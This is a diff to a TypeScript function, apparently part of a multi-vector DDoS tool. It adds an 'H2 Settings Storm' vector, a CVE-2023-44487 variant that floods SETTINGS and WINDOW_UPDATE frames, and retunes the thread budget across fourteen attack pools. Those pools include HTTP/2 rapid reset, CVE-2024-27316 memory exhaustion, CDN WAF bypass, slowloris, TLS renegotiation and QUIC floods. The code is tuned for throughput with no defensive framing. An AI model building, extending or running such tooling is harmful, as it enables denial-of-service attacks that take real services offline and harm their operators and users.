@@ -191,6 +191,8 @@ async function runAttackWorkers(
   // Vector 11: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
   // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
   // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
+  // Vector 14: H2 Settings Storm       — CVE-2023-44487 variant: SETTINGS oscillation + half-open streams
+  //                                       + WINDOW_UPDATE flood = 3-layer HPACK + flow-control CPU burn
   //
   // ★ 32GB RAM / 8 vCPU optimized — worker counts tuned for I/O-bound parallelism.
   // Most attack vectors are I/O-bound (network + socket), not CPU-bound, so N > 8 workers
@@ -211,23 +213,25 @@ async function runAttackWorkers(
     const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
     const quicW   = 1;  // QUIC/H3 — UDP single worker
     const sslW    = 1;  // SSL Death Record
+    const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm (21M pkt/10s)
 
-    // Thread budget — 32GB/8vCPU optimized (13-vector split)
+    // Thread budget — 32GB/8vCPU optimized (14-vector split)
     // Percentages tuned to hit the new higher PROD caps in attack-worker.ts
-    const connT   = Math.max(80,  Math.round(threads * 0.08));
-    const slowT   = Math.max(80,  Math.round(threads * 0.10)); // 2 workers: each handles 50K/2=25K sockets
-    const h2T     = Math.max(200, Math.round(threads * 0.28)); // ★ CVE-2023-44487 + PING dominant
-    const contT   = Math.max(120, Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM — 16KB frames
-    const hpackT  = Math.max(100, Math.round(threads * 0.14)); // ★ HPACK eviction storm
-    const wafT    = Math.max(120, Math.round(threads * 0.20)); // ★ CF/Akamai WAF bypass
-    const wsT     = Math.max(80,  Math.round(threads * 0.10)); // WS goroutine hold + binary frames
-    const gqlT    = Math.max(50,  Math.round(threads * 0.08)); // GraphQL fragment bomb CPU
-    const udpT    = Math.max(40,  Math.round(threads * 0.06)); // L4 bandwidth saturation
-    const rudyT   = Math.max(60,  Math.round(threads * 0.08)); // Slow POST thread hold × 2 workers
-    const cacheT  = Math.max(50,  Math.round(threads * 0.07)); // CDN origin miss flood
-    const tlsT    = Math.max(40,  Math.round(threads * 0.06)); // RSA renegotiation × 2 workers
-    const quicT   = Math.max(24,  Math.round(threads * 0.05)); // QUIC/H3 DCID exhaust
-    const sslT    = Math.max(60,  Math.round(threads * 0.08)); // SSL Death Record × 1K slots
+    const connT   = Math.max(80,  Math.round(threads * 0.07));
+    const slowT   = Math.max(80,  Math.round(threads * 0.09)); // 2 workers: each handles 50K/2=25K sockets
+    const h2T     = Math.max(200, Math.round(threads * 0.24)); // ★ CVE-2023-44487 + PING dominant
+    const contT   = Math.max(120, Math.round(threads * 0.16)); // ★ CVE-2024-27316 OOM — 16KB frames
+    const hpackT  = Math.max(100, Math.round(threads * 0.12)); // ★ HPACK eviction storm
+    const wafT    = Math.max(120, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass
+    const wsT     = Math.max(80,  Math.round(threads * 0.09)); // WS goroutine hold + binary frames
+    const gqlT    = Math.max(50,  Math.round(threads * 0.07)); // GraphQL fragment bomb CPU
+    const udpT    = Math.max(40,  Math.round(threads * 0.05)); // L4 bandwidth saturation
+    const rudyT   = Math.max(60,  Math.round(threads * 0.07)); // Slow POST thread hold × 2 workers
+    const cacheT  = Math.max(50,  Math.round(threads * 0.06)); // CDN origin miss flood
+    const tlsT    = Math.max(40,  Math.round(threads * 0.05)); // RSA renegotiation × 2 workers
+    const quicT   = Math.max(24,  Math.round(threads * 0.04)); // QUIC/H3 DCID exhaust
+    const sslT    = Math.max(60,  Math.round(threads * 0.07)); // SSL Death Record × 1K slots
+    const stormT  = Math.max(100, Math.round(threads * 0.22)); // ★ H2 Settings Storm — 21M pkt/10s proven
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -255,6 +259,7 @@ async function runAttackWorkers(
       spawnPool("tls-renego",         target, port, tlsT,   tlsW,   signal, makeGeassOnStats("tls")),
       spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
       spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
+      spawnPool("h2-settings-storm",  target, port, stormT, stormW, signal, onStats),  // Vector 14
     ]);
     return;
   }
